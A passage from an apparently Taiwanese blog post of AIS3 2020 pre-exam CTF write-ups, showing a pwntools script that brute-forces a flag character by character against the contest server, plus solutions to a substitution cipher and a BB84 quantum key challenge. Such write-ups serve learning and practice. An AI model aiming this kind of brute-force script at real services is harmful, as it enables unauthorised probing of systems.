<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line">pp = pprint.PrettyPrinter(indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'60.250.197.227'</span></span><br><span class="line">port = <span class="number">11001</span></span><br><span class="line">flag = <span class="string">'AIS3&#123;A1r1ght_U_4r3_my_'</span></span><br><span class="line"><span class="comment"># 這個方法不穩定，有時候後面會壞掉，就從已經知道的 flag 前綴開始重跑腳本</span></span><br><span class="line"></span><br><span class="line">char_set = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char_set:</span><br><span class="line">        r = remote(host, port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r.recvuntil(<span class="string">': '</span>)</span><br><span class="line">            r.sendline(flag + i)</span><br><span class="line">            l = r.recvline()</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> dic:</span><br><span class="line">                dic[i] = int(l.split()[<span class="number">4</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[i] += int(l.split()[<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line">first_same = <span class="number">0</span></span><br><span class="line">prev_first = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line">    firx = <span class="literal">None</span></span><br><span class="line">    firy = <span class="number">0</span></span><br><span class="line">    secx = <span class="literal">None</span></span><br><span class="line">    secy = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'.'</span>, end=<span class="string">''</span>)</span><br><span class="line">        check()</span><br><span class="line">        <span class="comment"># find</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> dic.items():</span><br><span class="line">            <span class="keyword">if</span> y &gt; firy:</span><br><span class="line">                secx = firx</span><br><span class="line">                secy = firy</span><br><span class="line">                firy = y</span><br><span class="line">                firx = x</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> y &gt; secy:</span><br><span class="line">                    secy = y</span><br><span class="line">                    secx = x</span><br><span class="line">        print(<span class="string">'&#123;&#125; &#123;&#125;; &#123;&#125; &#123;&#125;'</span>.format(secx, secy, firx, firy))</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="keyword">if</span> prev_first == firx:</span><br><span class="line">            first_same += <span class="number">1</span></span><br><span class="line">        prev_first = firx</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="keyword">if</span> firy - secy &gt;= <span class="number">50</span> <span class="keyword">or</span> first_same &gt;= <span class="number">10</span>:</span><br><span class="line">            first_same = <span class="number">0</span></span><br><span class="line">            prev_first = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(mx, my)</span></span><br><span class="line">    flag += firx</span><br><span class="line">    <span class="comment"># info(flag)</span></span><br><span class="line">    print(<span class="string">'&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br></pre></td></tr></table></figure>
<ul>
<li>p.s.<ul>
<li>pwntools 的腳本用指令列執行加上 <code>SILENT=1</code> 可以關掉 logger<ul>
<li>e.g. <code>./exp.py SILENT=1</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Brontosaurus"><a href="#Brontosaurus" class="headerlink" title="Brontosaurus"></a>Brontosaurus</h3><p>跟去年的<a href="/2019/05/31/ais3/ais3_2019_pre_exam/#kcufsj">解法</a>一樣</p>
<h3 id="T-Rex"><a href="#T-Rex" class="headerlink" title="T-Rex"></a>T-Rex</h3><p>這題題目是一張表，很明顯可以看出講下方那串依照上面這張表就可以對應出 flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">        !       @       #       $       %       &amp;</span><br><span class="line"></span><br><span class="line">!       V       F       Y       J       6       1</span><br><span class="line"></span><br><span class="line">@       5       0       M       2       9       L</span><br><span class="line"></span><br><span class="line">#       I       W       H       S       4       Q</span><br><span class="line"></span><br><span class="line">$       K       G       B       X       T       A</span><br><span class="line"></span><br><span class="line">%       E       3       C       7       P       N</span><br><span class="line"></span><br><span class="line">&amp;       U       Z       8       R       D       O</span><br><span class="line"></span><br><span class="line">&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;</span><br></pre></td></tr></table></figure>
<p>簡單寫個腳本就能得到 flag</p>
<ul>
<li><a href="https://ideone.com/8y3FkX" target="_blank" rel="noopener">https://ideone.com/8y3FkX</a></li>
</ul>
<h3 id="Octopus"><a href="#Octopus" class="headerlink" title="Octopus"></a>Octopus</h3><p>這題給了一個 py 檔，裡頭實作簡單模擬了 BB84 量子密鑰分發協定，但是 <code>key_exchange</code> 的部分被挖掉了<br>想法：看懂 BB84 ，並實作就可拿到 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment"># https://stackoverflow.com/questions/7396849/convert-binary-to-ascii-and-vice-versa</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2bytes</span><span class="params">(i)</span>:</span></span><br><span class="line">    hex_string = <span class="string">'%x'</span> % i</span><br><span class="line">    n = len(hex_string)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(hex_string.zfill(n + (n &amp; <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">bisas = eval(open(<span class="string">'basis'</span>, <span class="string">'r'</span>).read())</span><br><span class="line">myBisas = eval(open(<span class="string">'mybasis'</span>, <span class="string">'r'</span>).read())</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">qubit = eval(open(<span class="string">'qubit'</span>, <span class="string">'r'</span>).read())</span><br><span class="line"></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">if</span> bisas[i] == <span class="string">'+'</span> <span class="keyword">and</span> myBisas[i] == <span class="string">'+'</span>:</span><br><span class="line">        <span class="keyword">if</span> qubit[i] == (<span class="number">1</span>+<span class="number">0j</span>):</span><br><span class="line">            key += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">elif</span> qubit[i] == (<span class="number">0</span>+<span class="number">1j</span>):</span><br><span class="line">            key += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">elif</span> bisas[i] == <span class="string">'x'</span> <span class="keyword">and</span> myBisas[i] == <span class="string">'x'</span>:</span><br><span class="line">        <span class="keyword">if</span> qubit[i] == complex(<span class="number">0.707</span>, +<span class="number">0.707</span>):</span><br><span class="line">            key += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">elif</span> qubit[i] == complex(<span class="number">0.707</span>, <span class="number">-0.707</span>):</span><br><span class="line">            key += <span class="string">'1'</span></span><br><span class="line">dec = int(key[:<span class="number">400</span>], <span class="number">2</span>) ^ <span class="number">2114605261815340712424659413225647507317872952942366497800823462312932228799031989657646284020761432666257418566252521668</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'&#123;:b&#125;'</span>.format(dec))</span><br><span class="line">print(int2bytes(dec))</span><br></pre></td></tr></table></figure>

        
        <div>
          <hr>
          <p style="margin-bottom: 0;">如果你覺得這篇文章很棒，請你不吝點讚 (ﾟ∀ﾟ)</p>
          <iframe width="100%" height="230px" scrolling="no" frameborder="0" id="player" src="https://button.like.co/in/embed/a82611141/button/?referrer=http://blog.roy4801.tw/2020/06/12/ais3/ais3_2020_pre_exam/" allowfullscreen="true"></iframe>
        </div>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.roy4801.tw/2020/06/12/ais3/ais3_2020_pre_exam/" data-id="ckbulp0wk0045fhtkdyg28afu" class="article-share-link">分享</a>
      
      
        <a href="http://blog.roy4801.tw/2020/06/12/ais3/ais3_2020_pre_exam/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B3%BD/" rel="tag">比賽</a></li></ul>

    </footer>
  </div>
  
    
 
<script src="/jquery/jquery.min.js"></script>

  <div id="random_posts">
    <h2>推薦文章</h2>
    <div class="random_posts_ul">
      <script>
          var random_count =4
          var site = {BASE_URI:'/'};
          function load_random_posts(obj) {
              var arr=site.posts;
              if (!obj) return;
              // var count = $(obj).attr('data-count') || 6;
              for (var i, tmp, n = arr.length; n; i = Math.floor(Math.random() * n), tmp = arr[--n], arr[n] = arr[i], arr[i] = tmp);
              arr = arr.slice(0, random_count);
              var html = '<ul>';
            
              for(var j=0;j<arr.length;j++){
                var item=arr[j];
                html += '<li><strong>' + 
                item.date + ':&nbsp;&nbsp;<a href="' + (site.BASE_URI+item.uri) + '">' + 
                (item.title || item.uri) + '</a></strong>';
                if(item.excerpt){
                  html +='<div class="post-excerpt">'+item.excerpt+'</div>';
                }
                html +='</li>';
                
              }
              $(obj).html(html + '</ul>');
          }
          $('.random_posts_ul').each(function () {
              var c = this;
              if (!site.posts || !site.posts.length){
                  $.getJSON(site.BASE_URI + 'js/posts.js',function(json){site.posts = json;load_random_posts(c)});
              } 
               else{
                load_random_posts(c);
              }
          });
      </script>
    </div>
  </div>

    
<nav id="article-nav">
  
  
    <a href="/2020/06/04/c++/smart_pointer/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Smart Pointer 介紹/用法</div>
    </a>
  
</nav>

  
</article>
 
     
  <div class="comments" id="comments">
    
     
    <section id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
        </noscript>
      </div>
      </section>
      
       
      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    
       
      
      
  </div>
 
  

</section>
           
    <aside id="sidebar">
  
    

  
    
    <div class="widget-wrap">
    
      <div class="widget" id="toc-widget-fixed">
      
        <strong class="toc-title">文章目錄</strong>
        <div class="toc-widget-list">
              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#官方解法"><span class="toc-number">1.</span> <span class="toc-text">官方解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BOF"><span class="toc-number">2.1.</span> <span class="toc-text">BOF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nonsense"><span class="toc-number">2.2.</span> <span class="toc-text">nonsense</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Portal-Gun"><span class="toc-number">2.3.</span> <span class="toc-text">Portal Gun</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TsaiBro"><span class="toc-number">3.1.</span> <span class="toc-text">TsaiBro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fallen-Beat"><span class="toc-number">3.2.</span> <span class="toc-text">Fallen Beat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#patch"><span class="toc-number">3.2.1.</span> <span class="toc-text">patch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#static"><span class="toc-number">3.2.2.</span> <span class="toc-text">static</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stand-up-Brain"><span class="toc-number">3.3.</span> <span class="toc-text">Stand up! Brain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Squirrel"><span class="toc-number">4.1.</span> <span class="toc-text">Squirrel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Elephant"><span class="toc-number">4.2.</span> <span class="toc-text">Elephant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shark"><span class="toc-number">4.3.</span> <span class="toc-text">Shark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snake"><span class="toc-number">4.4.</span> <span class="toc-text">Snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Owl"><span class="toc-number">4.5.</span> <span class="toc-text">Owl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rhino"><span class="toc-number">4.6.</span> <span class="toc-text">Rhino</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Karuego"><span class="toc-number">5.1.</span> <span class="toc-text">Karuego</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shichirou"><span class="toc-number">5.2.</span> <span class="toc-text">Shichirou</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Soy"><span class="toc-number">5.3.</span> <span class="toc-text">Soy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Saburo"><span class="toc-number">5.4.</span> <span class="toc-text">Saburo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">6.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Brontosaurus"><span class="toc-number">6.1.</span> <span class="toc-text">Brontosaurus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#T-Rex"><span class="toc-number">6.2.</span> <span class="toc-text">T-Rex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Octopus"><span class="toc-number">6.3.</span> <span class="toc-text">Octopus</span></a></li></ol></li></ol>
          </div>
      </div>
    </div>

  
    

  
    
  
    

  
    
  
    
  
    

  
    
  
</aside>

      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-left">
      &copy; 2018 - 2020 roy4801&nbsp;|&nbsp;
      Theme by <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
    </div>
     <div id="footer-right">
      聯繫方式&nbsp;|&nbsp;YTgyNjExMTQxQGdtYWlsLmNvbQo=
    </div>
  </div>
</footer>
 
<script src="/jquery/jquery.min.js"></script>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首頁</a>
  
    <a href="/archives" class="mobile-nav-link">歸檔</a>
  
    <a href="/about" class="mobile-nav-link">關於</a>
  
</nav>
    <img class="back-to-top-btn" src="/images/fly-to-top.png"/>
<script>
// Elevator script included on the page, already.
window.onload = function() {
  var elevator = new Elevator({
    selector:'.back-to-top-btn',
    element: document.querySelector('.back-to-top-btn'),
    duration: 1000 // milliseconds
  });
}
</script>
      

<script>
  var disqus_shortname = 'roy-blog';
  
  var disqus_url = 'http://blog.roy4801.tw/2020/06/12/ais3/ais3_2020_pre_exam/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>







<!-- author:forvoid begin -->
<!-- author:forvoid begin -->

<!-- author:forvoid end -->

<!-- author:forvoid end -->


  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      })
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      })
    </script>
    <script type="text/javascript" src="https://cdn.rawgit.com/mathjax/MathJax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


 
<script src="/js/is.js"></script>



  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/elevator.js"></script>

  </div>
</body>
</html>